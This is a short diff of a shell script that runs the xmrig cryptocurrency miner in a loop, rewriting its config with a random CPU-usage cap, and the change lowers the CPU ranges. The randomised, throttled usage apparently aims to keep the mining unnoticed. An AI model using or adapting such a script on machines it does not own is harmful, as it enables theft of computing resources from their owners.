@@ -10,8 +10,8 @@ tar -xvf xmrig
 cp xmrig-6.16.2/xmrig xmrig
 t_min=45
 t_max=120
-cpu_min=50
-cpu_max=100
+cpu_min=25
+cpu_max=50
 chmod 777 xmrig
 while true :
   do
@@ -21,7 +21,7 @@ while true :
     echo "The variable is 4"
     cpu=$(shuf -i 50-65 -n 1)
     else
-    cpu=$(shuf -i 89-100 -n 1)
+    cpu=$(shuf -i 80-89 -n 1)
     fi
     echo $cpu
     cat config.json |jq -r --arg cpu "$cpu" '."max-cpu-usage"=$cpu' > u.json
